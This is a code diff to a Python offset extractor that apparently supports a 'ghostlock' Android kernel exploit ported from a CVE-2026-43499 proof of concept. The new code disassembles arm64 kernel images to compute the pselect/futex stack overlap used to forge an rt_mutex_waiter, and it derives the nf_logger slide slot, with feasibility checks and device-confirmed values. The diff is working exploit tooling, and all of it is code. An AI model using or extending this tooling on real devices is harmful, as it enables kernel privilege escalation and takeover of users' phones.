@@ -53,6 +53,10 @@ class ExtractError(RuntimeError):
     pass
 
 
+class InfeasibleError(ExtractError):
+    """The kernel stack layout cannot support the pselect/futex route."""
+
+
 def align(value: int, size: int) -> int:
     return (value + size - 1) & ~(size - 1)
 
@@ -229,6 +233,7 @@ class BtfType:
     kind: int
     size: int
     members: list[BtfMember] = field(default_factory=list)
+    enum_values: list[tuple[str, int]] = field(default_factory=list)
 
 
 class Btf:
@@ -288,12 +293,41 @@ class Btf:
                         BtfMember(self.string(name), member_type, bit_offset & 0xFFFFFF)
                     )
                 cursor += extra
+            elif kind == KIND_ENUM:
+                extra = vlen * 8
+                if cursor + extra > len(self.types_raw):
+                    raise ExtractError("truncated BTF enum members")
+                kflag = bool(info & (1 << 31))
+                for index in range(vlen):
+                    ename, raw_value = struct.unpack_from(
+                        "<II", self.types_raw, cursor + index * 8
+                    )
+                    if kflag:
+                        raw_value = struct.unpack(
+                            "<i", struct.pack("<I", raw_value)
+                        )[0]
+                    item.enum_values.append((self.string(ename), raw_value))
+                cursor += extra
+            elif kind == KIND_ENUM64:
+                extra = vlen * 12
+                if cursor + extra > len(self.types_raw):
+                    raise ExtractError("truncated BTF enum64 members")
+                kflag = bool(info & (1 << 31))
+                for index in range(vlen):
+                    ename, low, high = struct.unpack_from(
+                        "<III", self.types_raw, cursor + index * 12
+                    )
+                    value = low | (high << 32)
+                    if kflag and high & 0x80000000:
+                        value -= 1 << 64
+                    item.enum_values.append((self.string(ename), value))
+                cursor += extra
             else:
                 unit = fixed.get(kind)
                 if unit is None:
                     raise ExtractError(f"unsupported BTF kind {kind}")
                 cursor += unit * vlen if kind in (
-                    KIND_ENUM, KIND_FUNC_PROTO, KIND_DATASEC, KIND_ENUM64
+                    KIND_FUNC_PROTO, KIND_DATASEC
                 ) else unit
             self.types[type_id] = item
             if item.name:
@@ -342,6 +376,57 @@ class Btf:
     def size(self, struct_name: str) -> int | None:
         item = self.struct(struct_name)
         return item.size if item else None
+
+    def enum_value(self, enum_name: str, member_name: str) -> int | None:
+        """Value of one member of a named enum/enum64; None when ambiguous."""
+        items = [
+            item for item in self.by_name.get(enum_name, [])
+            if item.kind in (KIND_ENUM, KIND_ENUM64)
+        ]
+        if not items:
+            return None
+        item = max(items, key=lambda item: len(item.enum_values))
+        values = [value for name, value in item.enum_values if name == member_name]
+        return values[0] if len(values) == 1 else None
+
+    def unique_enum_member_value(self, member_name: str) -> int | None:
+        """Value of an enum member that appears exactly once in the whole BTF."""
+        matches = [
+            (item.type_id, value)
+            for item in self.types.values()
+            if item.kind in (KIND_ENUM, KIND_ENUM64)
+            for name, value in item.enum_values
+            if name == member_name
+        ]
+        if len(matches) != 1:
+            return None
+        return matches[0][1]
+
+    def type_size(self, type_id: int, seen: frozenset[int] = frozenset()) -> int | None:
+        """Byte size of a BTF type id, resolving qualifiers and arrays."""
+        resolved = self.resolve(type_id)
+        if resolved is None:
+            return None
+        if resolved.kind == KIND_PTR:
+            return 8
+        if resolved.kind == KIND_ARRAY:
+            return None
+        if resolved.type_id in seen:
+            return None
+        if resolved.kind in (KIND_INT, KIND_STRUCT, KIND_UNION, KIND_ENUM,
+                             KIND_ENUM64, KIND_FLOAT):
+            return resolved.size
+        return None
+
+    def direct_field_size(self, struct_name: str, field_name: str) -> int | None:
+        """Byte size of a direct (non-anonymous) struct member's type."""
+        item = self.struct(struct_name)
+        if item is None:
+            return None
+        matches = [member for member in item.members if member.name == field_name]
+        if len(matches) != 1:
+            return None
+        return self.type_size(matches[0].type_id)
 
 
 def parse_kallsyms(path: Path) -> tuple[dict[str, set[int]], dict[str, set[str]]]:
@@ -561,6 +646,495 @@ def scan_ashmem_fops(
     return next(iter(candidates)) if len(candidates) == 1 else None
 
 
+
+# ---------------------------------------------------------------------------
+# llvm-objdump disassembly: auto-derive pselect_waiter_shift and the
+# nf_logger slide slot.  Ported from Linuxoid-cn/CVE-2026-43499-Poc-Analysis
+# generate_target.py (derive_pselect_layout / derive_nf_logger_registration).
+#
+# Kernel Image note: the arm64 Image is a PE/COFF file whose section raw
+# offsets equal their virtual addresses, so llvm-objdump addresses equal the
+# base-relative kallsyms offsets (raw_ptr == vaddr == RVA).
+# ---------------------------------------------------------------------------
+
+PSELECT_ROUTE_NFDS = 320
+OBJDUMP_CAP = 0x2000
+
+
+def find_llvm_objdump(explicit: str | None) -> str | None:
+    """Locate llvm-objdump: --llvm-objdump, PATH, then common NDK installs."""
+    if explicit:
+        tool = Path(explicit)
+        if not tool.is_file():
+            raise ExtractError(f"llvm-objdump not found: {tool}")
+        return str(tool)
+    tool = shutil.which("llvm-objdump")
+    if tool:
+        return tool
+    roots = [
+        Path(os.environ.get("ANDROID_NDK_HOME", "")),
+        Path(os.environ.get("ANDROID_NDK_ROOT", "")),
+        Path(os.environ.get("LOCALAPPDATA", "")) / "Android" / "Sdk" / "ndk",
+        Path("D:/AndroidSDK/ndk"),
+    ]
+    for root in roots:
+        if not root.is_dir():
+            continue
+        prebuilts = sorted(
+            root.glob("*/toolchains/llvm/prebuilt/*/bin/llvm-objdump.exe")
+        )
+        if prebuilts:
+            return str(prebuilts[-1])
+        direct = root / "toolchains/llvm/prebuilt/windows-x86_64/bin/llvm-objdump.exe"
+        if direct.is_file():
+            return str(direct)
+    return None
+
+
+def run_objdump(tool: str, kernel_path: Path, start: int, stop: int) -> str:
+    if stop <= start or stop - start > 0x20000:
+        raise ExtractError(f"disassembly range invalid: 0x{start:x}..0x{stop:x}")
+    proc = subprocess.run(
+        [
+            tool, "-d", "--triple=aarch64",
+            f"--start-address=0x{start:x}", f"--stop-address=0x{stop:x}",
+            str(kernel_path),
+        ],
+        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    )
+    if proc.returncode != 0:
+        raise ExtractError(f"llvm-objdump failed: {proc.stderr.strip()}")
+    if "Disassembly of section" not in proc.stdout:
+        raise ExtractError(
+            f"llvm-objdump produced no disassembly for 0x{start:x}..0x{stop:x}"
+        )
+    return proc.stdout
+
+
+def relative_symbols(
+    symbols: dict[str, set[int]], base: int
+) -> tuple[dict[str, set[int]], list[int]]:
+    """Rebase kallsyms onto _text and return a sorted list of all offsets."""
+    relative: dict[str, set[int]] = {}
+    all_offsets: set[int] = set()
+    for name, values in symbols.items():
+        offsets = {value - base for value in values if value >= base}
+        if offsets:
+            relative[name] = offsets
+            all_offsets.update(offsets)
+    return relative, sorted(all_offsets)
+
+
+def unique_offset(symbols: dict[str, set[int]], name: str) -> int:
+    values = symbols.get(name)
+    if not values or len(values) != 1:
+        raise ExtractError(
+            f"kallsyms symbol {name!r} not unique: "
+            + repr(sorted(hex(v) for v in values or set()))
+        )
+    return next(iter(values))
+
+
+def disassemble_symbol(
+    tool: str,
+    kernel_path: Path,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    name: str,
+    cap: int = OBJDUMP_CAP,
+) -> str:
+    start = unique_offset(symbols, name)
+    higher = [off for off in sorted_offsets if off > start]
+    stop = min(start + cap, higher[0] if higher else start + cap)
+    return run_objdump(tool, kernel_path, start, stop)
+
+
+def first_sp_frame(text: str, name: str) -> int:
+    matches = re.findall(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
+    if not matches:
+        raise ExtractError(f"{name} has no explicit `sub sp,sp,#imm` frame")
+    return int(matches[0], 16)
+
+
+def has_direct_call(text: str, target: int) -> bool:
+    return bool(re.search(rf"\bbl\s+0x{target:x}\b", text, re.I))
+
+
+def validate_frame_live_at(text: str, anchor: str, name: str) -> None:
+    """Prove the first explicit frame allocation is still live at one anchor."""
+    lines = text.splitlines()
+    anchors = [
+        index for index, line in enumerate(lines)
+        if re.search(anchor, line, re.I)
+    ]
+    if len(anchors) != 1:
+        raise ExtractError(f"{name} frame anchor not unique: {len(anchors)}")
+    anchor_index = anchors[0]
+    subs = [
+        index for index, line in enumerate(lines[:anchor_index])
+        if re.search(r"\bsub\s+sp,\s*sp,\s*#0x[0-9a-f]+", line, re.I)
+    ]
+    if len(subs) != 1:
+        raise ExtractError(f"{name} has {len(subs)} SP frames before anchor")
+    for line in lines[subs[0] + 1:anchor_index]:
+        if re.search(r"\b(?:add|sub)\s+sp,\s*sp,", line, re.I):
+            raise ExtractError(f"{name} adjusts SP again before anchor")
+        if re.search(r"\[\s*sp\],\s*#0x[0-9a-f]+", line, re.I):
+            raise ExtractError(f"{name} restores SP post-index before anchor")
+
+
+def derive_pselect_layout(
+    tool: str,
+    kernel_path: Path,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    btf: Btf,
+    route_nfds: int,
+) -> dict[str, int]:
+    """Derive the pselect/futex waiter word shift from disassembly.
+
+    Handles both call chains:
+      __arm64_sys_pselect6 -> core_sys_select                 (do_pselect inlined)
+      __arm64_sys_pselect6 -> do_pselect -> core_sys_select   (6.6 middle layer)
+    """
+    names = {
+        "pselect_wrapper": "__arm64_sys_pselect6",
+        "pselect_core": "core_sys_select",
+        "futex_wrapper": "__arm64_sys_futex",
+        "futex_dispatch": "do_futex",
+        "futex_wait": "futex_wait_requeue_pi",
+    }
+    if unique_offset_optional(symbols, "do_pselect") is not None:
+        names["pselect_dispatch"] = "do_pselect"
+
+    dis = {
+        key: disassemble_symbol(tool, kernel_path, symbols, sorted_offsets, name)
+        for key, name in names.items()
+    }
+
+    pselect_chain = ["pselect_wrapper"]
+    pselect_core_addr = unique_offset(symbols, names["pselect_core"])
+    if has_direct_call(dis["pselect_wrapper"], pselect_core_addr):
+        pass
+    elif "pselect_dispatch" in names and has_direct_call(
+        dis["pselect_wrapper"], unique_offset(symbols, names["pselect_dispatch"])
+    ):
+        if not has_direct_call(dis["pselect_dispatch"], pselect_core_addr):
+            raise ExtractError("do_pselect does not directly call core_sys_select")
+        pselect_chain.append("pselect_dispatch")
+    else:
+        raise ExtractError(
+            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect"
+        )
+    pselect_chain.append("pselect_core")
+
+    if not has_direct_call(
+        dis["futex_wrapper"], unique_offset(symbols, names["futex_dispatch"])
+    ):
+        raise ExtractError("__arm64_sys_futex does not directly call do_futex")
+    if not has_direct_call(
+        dis["futex_dispatch"], unique_offset(symbols, names["futex_wait"])
+    ):
+        raise ExtractError("do_futex does not directly call futex_wait_requeue_pi")
+
+    for caller_key, callee_key in zip(pselect_chain, pselect_chain[1:]):
+        validate_frame_live_at(
+            dis[caller_key],
+            rf"\bbl\s+0x{unique_offset(symbols, names[callee_key]):x}\b",
+            names[caller_key],
+        )
+    validate_frame_live_at(
+        dis["futex_wrapper"],
+        rf"\bbl\s+0x{unique_offset(symbols, names['futex_dispatch']):x}\b",
+        names["futex_wrapper"],
+    )
+    validate_frame_live_at(
+        dis["futex_dispatch"],
+        rf"\bbl\s+0x{unique_offset(symbols, names['futex_wait']):x}\b",
+        names["futex_dispatch"],
+    )
+    frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}
+
+    pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
+    wake_state = btf.field("rt_mutex_waiter", "wake_state")
+    if pi_tree is None or wake_state is None:
+        raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
+    waiter_candidates: list[tuple[str, int]] = []
+    for reg, imm_text in re.findall(
+        r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
+    ):
+        imm = int(imm_text, 16)
+        if re.search(
+            rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
+            dis["futex_wait"], re.I,
+        ):
+            waiter_candidates.append((reg.lower(), imm))
+    waiter_candidates = list(dict.fromkeys(waiter_candidates))
+    if len(waiter_candidates) != 1:
+        raise ExtractError(
+            f"futex waiter stack local not unique: {waiter_candidates}"
+        )
+    waiter_reg, waiter_local = waiter_candidates[0]
+    validate_frame_live_at(
+        dis["futex_wait"],
+        rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
+        names["futex_wait"],
+    )
+    for required in (waiter_local, waiter_local + wake_state):
+        if not re.search(rf"\[sp,\s*#0x{required:x}\]", dis["futex_wait"], re.I):
+            raise ExtractError(
+                f"futex waiter candidate 0x{waiter_local:x} not cross-validated "
+                f"by a real field store at 0x{required:x}"
+            )
+
+    add_sp: list[tuple[str, int]] = [
+        (reg.lower(), int(imm, 16))
+        for reg, imm in re.findall(
+            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)",
+            dis["pselect_core"], re.I,
+        )
+    ]
+    buffer_candidates: set[int] = set()
+    for reg, imm in add_sp:
+        if not re.search(rf"\bmov\s+{re.escape(reg)},\s*x0\b",
+                         dis["pselect_core"], re.I):
+            continue
+        peers = {peer for peer, peer_imm in add_sp if peer_imm == imm and peer != reg}
+        if any(
+            re.search(rf"\bcmp\s+{re.escape(reg)},\s*{re.escape(peer)}\b",
+                      dis["pselect_core"], re.I)
+            or re.search(rf"\bcmp\s+{re.escape(peer)},\s*{re.escape(reg)}\b",
+                         dis["pselect_core"], re.I)
+            for peer in peers
+        ):
+            buffer_candidates.add(imm)
+    if len(buffer_candidates) != 1:
+        raise ExtractError(
+            f"core_sys_select fd_set buffer candidates not unique: "
+            f"{sorted(hex(v) for v in buffer_candidates)}"
+        )
+    pselect_buffer = next(iter(buffer_candidates))
+    buffer_regs = sorted({
+        reg for reg, imm in add_sp
+        if imm == pselect_buffer
+        and re.search(rf"\bmov\s+{re.escape(reg)},\s*x0\b",
+                      dis["pselect_core"], re.I)
+    })
+    if not buffer_regs:
+        raise ExtractError("core_sys_select stack buffer has no output register")
+    for buffer_reg in buffer_regs:
+        validate_frame_live_at(
+            dis["pselect_core"],
+            rf"\badd\s+{re.escape(buffer_reg)},\s*sp,\s*#0x{pselect_buffer:x}\b",
+            f"{names['pselect_core']}/{buffer_reg}",
+        )
+
+    fds_bytes = ((route_nfds + 63) // 64) * 8
+    thresholds = [
+        int(value, 16)
+        for value in re.findall(r"\bcmp\s+x\d+,\s*#0x([0-9a-f]+)",
+                                dis["pselect_core"], re.I)
+    ]
+    if not any(fds_bytes < threshold <= fds_bytes + 8 for threshold in thresholds):
+        raise ExtractError(
+            f"core_sys_select threshold does not prove route_nfds={route_nfds} "
+            f"uses the stack fd_set path"
+        )
+
+    pselect_word0 = -sum(frames[key] for key in pselect_chain) + pselect_buffer
+    futex_waiter = (
+        -frames["futex_wrapper"]
+        - frames["futex_dispatch"]
+        - frames["futex_wait"]
+        + waiter_local
+    )
+    delta = futex_waiter - pselect_word0
+    if delta < 0 or delta % 8:
+        raise ExtractError(f"pselect/futex overlap is not a non-negative qword: {delta}")
+    shift = delta // 8
+    if shift > 16:
+        raise InfeasibleError(
+            f"PSELECT_WAITER_WORD_SHIFT too large: {shift}"
+        )
+    # Feasibility (ghostlock-oneplus rule): core_sys_select copies only
+    # 3 x FDS_BYTES(route_nfds) bytes of user fd_set data onto the stack,
+    # i.e. global words 0..14 for route_nfds=320.  The fake rt_mutex_waiter
+    # starts at pselect word `shift`, and its lock field is at waiter
+    # qword 11, so shift + 11 must stay <= 14 or task/lock land in the
+    # kernel-zeroed tail of stack_fds and the route can never work.
+    if shift > 3:
+        raise InfeasibleError(
+            f"futex waiter starts {shift} qwords above the fd_set buffer; "
+            f"task/lock would land outside the user-controlled words 0..14 "
+            f"(max feasible shift is 3)"
+        )
+    if shift == 3:
+        print(
+            "warning: waiter fits at the last usable word (shift=3); "
+            "wake_state falls outside the copied fd_set and relies on the "
+            "kernel zero-initialising it",
+            file=sys.stderr,
+        )
+    return {
+        "PSELECT_WAITER_WORD_SHIFT": shift,
+        "waiter_local": waiter_local,
+        "pselect_word0": pselect_word0,
+        "futex_waiter": futex_waiter,
+        "pselect_buffer": pselect_buffer,
+        "chain": "->".join(names[key] for key in pselect_chain),
+        **{f"frame_{key}": frames[key] for key in frames},
+    }
+
+
+def unique_offset_optional(symbols: dict[str, set[int]], name: str) -> int | None:
+    try:
+        return unique_offset(symbols, name)
+    except ExtractError:
+        return None
+
+
+def _materialized_address(text: str, register: str, address: int) -> bool:
+    lines = text.splitlines()
+    page = address & ~0xFFF
+    page_off = address & 0xFFF
+    for index, line in enumerate(lines):
+        if not re.search(rf"\badrp\s+{register},\s*0x{page:x}\b", line, re.I):
+            continue
+        nearby = "\n".join(lines[index + 1:index + 4])
+        if re.search(
+            rf"\badd\s+{register},\s*{register},\s*#0x{page_off:x}\b",
+            nearby, re.I,
+        ):
+            return True
+    return False
+
+
+def _u32(data: bytes, off: int) -> int:
+    if off < 0 or off + 4 > len(data):
+        raise ExtractError(f"u32 read out of range: 0x{off:x}")
+    return struct.unpack_from("<I", data, off)[0]
+
+
+def _u64(data: bytes, off: int) -> int:
+    if off < 0 or off + 8 > len(data):
+        raise ExtractError(f"u64 read out of range: 0x{off:x}")
+    return struct.unpack_from("<Q", data, off)[0]
+
+
+def _cstr(data: bytes, off: int, max_len: int = 4096) -> str:
+    if off < 0 or off >= len(data):
+        raise ExtractError(f"C string out of range: 0x{off:x}")
+    end = data.find(b"\x00", off, min(len(data), off + max_len))
+    if end < 0:
+        raise ExtractError(f"unterminated C string at 0x{off:x}")
+    return data[off:end].decode("utf-8", "replace")
+
+
+def derive_nf_logger_registration(
+    tool: str,
+    kernel_path: Path,
+    kernel: bytes,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    btf: Btf,
+) -> dict[str, int]:
+    """Derive loggers[0][NF_LOG_TYPE_ULOG] and validate nfulnl_logger.
+
+    Disassembles nf_log_register/nfnetlink_log_init and closes the slot index
+    against BTF nf_logger.type / NF_LOG_TYPE_ULOG / NFPROTO_UNSPEC.
+    """
+    register_text = disassemble_symbol(
+        tool, kernel_path, symbols, sorted_offsets, "nf_log_register", 0x800
+    )
+    init_text = disassemble_symbol(
+        tool, kernel_path, symbols, sorted_offsets, "nfnetlink_log_init", 0x800
+    )
+    logger = unique_offset(symbols, "nfulnl_logger")
+    loggers = unique_offset(symbols, "loggers")
+    type_off = btf.field("nf_logger", "type")
+    if type_off is None or btf.direct_field_size("nf_logger", "type") != 4:
+        raise ExtractError("BTF nf_logger.type is not a 4-byte enum")
+    logger_type = _u32(kernel, logger + type_off)
+    ulog_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
+    max_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
+    nfproto_unspec = btf.unique_enum_member_value("NFPROTO_UNSPEC")
+    if (
+        ulog_value is None or max_value is None or nfproto_unspec is None
+        or logger_type != ulog_value or not (0 <= ulog_value < max_value)
+    ):
+        raise ExtractError(
+            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: "
+            f"data={logger_type}, ulog={ulog_value}, max={max_value}"
+        )
+
+    logger_aliases = set(re.findall(r"\bmov\s+(x\d+),\s*x1\b", register_text, re.I))
+    if len(logger_aliases) != 1:
+        raise ExtractError(
+            f"nf_log_register logger alias not unique: {logger_aliases}"
+        )
+    logger_reg = next(iter(logger_aliases)).lower()
+    type_loads = set(re.findall(
+        rf"\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]",
+        register_text, re.I,
+    ))
+    if len(type_loads) != 1:
+        raise ExtractError(
+            f"nf_log_register type load not unique: {type_loads}"
+        )
+    type_reg = next(iter(type_loads))
+    base_regs = {
+        match.group(1).lower()
+        for match in re.finditer(r"\badrp\s+(x\d+),", register_text, re.I)
+        if _materialized_address(register_text, match.group(1).lower(), loggers)
+    }
+    indexed: list[tuple[str, str]] = []
+    for base_reg in base_regs:
+        for destination, pf_reg in re.findall(
+            rf"\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4",
+            register_text, re.I,
+        ):
+            if re.search(
+                rf"\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3",
+                register_text, re.I,
+            ):
+                indexed.append((destination.lower(), pf_reg.lower()))
+    indexed = list(dict.fromkeys(indexed))
+    if len(indexed) != 1:
+        raise ExtractError(
+            f"nf_log_register loggers[pf][type] dataflow not unique: {indexed}"
+        )
+    slot_reg, _ = indexed[0]
+    if not re.search(
+        rf"\bstlr\s+{logger_reg},\s*\[{slot_reg}\]", register_text, re.I
+    ):
+        raise ExtractError("nf_log_register does not store the logger to the slot")
+    if not re.search(rf"\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b",
+                     register_text, re.I):
+        raise ExtractError("nf_log_register type bound not closed with NF_LOG_TYPE_MAX")
+
+    target = unique_offset(symbols, "nf_log_register")
+    calls = [
+        index for index, line in enumerate(init_text.splitlines())
+        if re.search(rf"\bbl\s+0x{target:x}\b", line, re.I)
+    ]
+    if len(calls) != 1:
+        raise ExtractError(f"nfnetlink_log_init -> nf_log_register calls: {len(calls)}")
+    init_lines = init_text.splitlines()
+    call_window = "\n".join(init_lines[max(0, calls[0] - 6):calls[0]])
+    if nfproto_unspec != 0 or not re.search(r"\bmov\s+w0,\s*wzr\b", call_window, re.I):
+        raise ExtractError("nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)")
+    if not _materialized_address(init_text, "x1", logger):
+        raise ExtractError("nfnetlink_log_init x1 does not materialize nfulnl_logger")
+    slot = loggers + ulog_value * 8
+    return {
+        "loggers": loggers,
+        "nfulnl_logger": logger,
+        "loggers_0_1": slot,
+        "nf_log_type_ulog": ulog_value,
+    }
+
+
+
 def resolve_structs(btf: Btf) -> dict[str, int | None]:
     result: dict[str, int | None] = {}
     for struct_name, fields in STRUCT_FIELDS.items():
@@ -642,7 +1216,11 @@ def kernel_struct_macro(release: str | None) -> str:
 
 
 def pselect_waiter_shift_for(release: str | None) -> int:
-    """6.12 GKI moved the pselect fd_set waiter word (shift 0); 6.6 OPPO -2."""
+    """Heuristic fallback only: 6.12 GKI places the waiter at word 0 (shift
+    -2 in our layout), 6.6 OPPO at word -2 (shift -2 too).  Not reliable for
+    kernels with a non-inlined do_pselect middle layer (e.g. some 6.6.77
+    builds put the waiter 12 words up, which is infeasible); prefer
+    --llvm-objdump derivation."""
     return 0 if kernel_struct_macro(release) == "STRUCT_OFFSETS_6_12" else -2
 
 
@@ -651,6 +1229,7 @@ def render_device(
     symbols: dict[str, int | None],
     structs: dict[str, int | None],
     phys: int | None,
+    pselect_shift: int,
 ) -> str:
     lines = [f"/* {release} */", ""]
     lines.append("OFFSETS_ENTRY(")
@@ -658,7 +1237,7 @@ def render_device(
     lines.append(f"    {kernel_struct_macro(release)},")
     if phys is not None:
         lines.append(f"    .kernel_phys_load = 0x{phys:x},")
-    lines.append(f"    .pselect_waiter_shift = {pselect_waiter_shift_for(release)},")
+    lines.append(f"    .pselect_waiter_shift = {pselect_shift},")
     for key, value in symbols.items():
         if value is None:
             continue
@@ -713,6 +1292,13 @@ def warn_existing_mismatches(
                 f"0x{existing[key]:08X}; this image extracts 0x{value:08X}",
                 file=sys.stderr,
             )
+            if key == "off_slide_loggers_0_1":
+                print(
+                    "warning:   loggers[0][1] is loggers + NF_LOG_TYPE_ULOG*8 "
+                    "(disassembly + BTF verified and confirmed on device for "
+                    "findn5/17pm); the older heuristic loggers + 0x10 was wrong.",
+                    file=sys.stderr,
+                )
 
 
 def register_device(name: str) -> Path:
@@ -730,7 +1316,7 @@ def register_device(name: str) -> Path:
     return header
 
 
-def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str) -> str:
+def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str, pselect_shift: int) -> str:
     lines = [f"/* Generated offsets for {release or name}. */", ""]
     lines.append("#define STRUCT_OFFSETS_EXTRACTED \\")
     task_keys = (
@@ -748,6 +1334,7 @@ def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[
     lines.append("OFFSETS_ENTRY(\"%s\"," % (release or name))
     if phys is not None:
         lines.append(f"  .kernel_phys_load=0x{phys:X},")
+    lines.append(f"  .pselect_waiter_shift={pselect_shift},")
     for key, value in symbols.items():
         if value is not None:
             lines.append(f"  .{key}=0x{value:08X},")
@@ -765,6 +1352,12 @@ def main(argv: list[str] | None = None) -> int:
     parser.add_argument("image", type=Path, help="boot.img, raw arm64 Image, or gzip Image")
     parser.add_argument("--kallsyms", type=Path)
     parser.add_argument("--kallsyms-finder")
+    parser.add_argument(
+        "--llvm-objdump",
+        help="path to llvm-objdump; auto-derive pselect_waiter_shift and the "
+        "nf_logger slide slot from disassembly (auto-detected via PATH/NDK "
+        "when omitted)",
+    )
     parser.add_argument(
         "--xbl-config",
         type=Path,
@@ -822,6 +1415,89 @@ def main(argv: list[str] | None = None) -> int:
                     "(file_operations pattern scan)",
                     file=sys.stderr,
                 )
+        derived: dict[str, int] = {}
+        objdump = find_llvm_objdump(args.llvm_objdump)
+        if objdump is not None:
+            with tempfile.TemporaryDirectory(prefix="ghostlock-disasm-") as tmp:
+                kernel_path = Path(tmp) / "kernel.bin"
+                kernel_path.write_bytes(boot.kernel)
+                rel_symbols, sorted_offsets = relative_symbols(symbols, base)
+                try:
+                    pselect = derive_pselect_layout(
+                        objdump, kernel_path, rel_symbols, sorted_offsets,
+                        btf, PSELECT_ROUTE_NFDS,
+                    )
+                except InfeasibleError as exc:
+                    print(
+                        f"error: pselect route not feasible on this kernel: {exc}",
+                        file=sys.stderr,
+                    )
+                    return 2
+                except ExtractError as exc:
+                    print(
+                        f"warning: pselect_waiter_shift derivation failed: {exc}",
+                        file=sys.stderr,
+                    )
+                else:
+                    # Linuxoid's fops waiter words start at index 0; ours
+                    # (and ghostlock-oneplus) start at index 2, so the shift
+                    # for our layout is the derived value minus 2.
+                    derived["pselect_waiter_shift"] = (
+                        pselect["PSELECT_WAITER_WORD_SHIFT"] - 2
+                    )
+                    frame_parts = " ".join(
+                        f"{key.split('_', 1)[1]}=0x{pselect[key]:x}"
+                        for key in ("frame_pselect_wrapper", "frame_pselect_dispatch",
+                                    "frame_pselect_core", "frame_futex_wrapper",
+                                    "frame_futex_dispatch", "frame_futex_wait")
+                        if key in pselect
+                    )
+                    print(
+                        f"info: pselect chain {pselect['chain']} frames={frame_parts} "
+                        f"buffer=0x{pselect['pselect_buffer']:x} "
+                        f"waiter=0x{pselect['waiter_local']:x} "
+                        f"shift={derived['pselect_waiter_shift']} "
+                        f"(derived {pselect['PSELECT_WAITER_WORD_SHIFT']} - 2)",
+                        file=sys.stderr,
+                    )
+                try:
+                    logger_info = derive_nf_logger_registration(
+                        objdump, kernel_path, boot.kernel,
+                        rel_symbols, sorted_offsets, btf,
+                    )
+                except ExtractError as exc:
+                    print(
+                        f"warning: loggers_0_1 derivation failed: {exc}",
+                        file=sys.stderr,
+                    )
+                else:
+                    derived["off_slide_loggers_0_1"] = logger_info["loggers_0_1"]
+                    print(
+                        f"info: nf_logger loggers=0x{logger_info['loggers']:x} "
+                        f"nfulnl_logger=0x{logger_info['nfulnl_logger']:x} "
+                        f"ulog={logger_info['nf_log_type_ulog']} "
+                        f"slot=0x{logger_info['loggers_0_1']:x}",
+                        file=sys.stderr,
+                    )
+        else:
+            print(
+                "warning: llvm-objdump not found; pselect_waiter_shift and "
+                "loggers_0_1 fall back to heuristics "
+                "(pass --llvm-objdump to enable auto-derivation)",
+                file=sys.stderr,
+            )
+        pselect_shift = derived.get(
+            "pselect_waiter_shift", pselect_waiter_shift_for(boot.release())
+        )
+        if "pselect_waiter_shift" not in derived:
+            print(
+                f"warning: using heuristic pselect_waiter_shift={pselect_shift} "
+                "(6.12=0, 6.6=-2); unreliable for kernels with a non-inlined "
+                "do_pselect middle layer, run with --llvm-objdump to derive",
+                file=sys.stderr,
+            )
+        if "off_slide_loggers_0_1" in derived:
+            symbol_offsets["off_slide_loggers_0_1"] = derived["off_slide_loggers_0_1"]
         struct_offsets = resolve_structs(btf)
         missing = {key for key, value in symbol_offsets.items() if value is None}
         existing = existing_entries().get(boot.release() or "", {})
@@ -869,7 +1545,7 @@ def main(argv: list[str] | None = None) -> int:
         if args.device:
             output = render_device(
                 boot.release(), symbol_offsets, struct_offsets,
-                args.kernel_phys_load,
+                args.kernel_phys_load, pselect_shift,
             )
             target = args.out or device_header_path(args.device)
             if (
@@ -890,7 +1566,10 @@ def main(argv: list[str] | None = None) -> int:
             warn_existing_mismatches(boot.release(), symbol_offsets)
             return 0
         if args.format == "c":
-            output = render_c(boot.release(), symbol_offsets, struct_offsets, args.kernel_phys_load, args.name)
+            output = render_c(
+                boot.release(), symbol_offsets, struct_offsets,
+                args.kernel_phys_load, args.name, pselect_shift,
+            )
         else:
             output = json.dumps(report, indent=2, sort_keys=True) + "\n"
         if args.out:
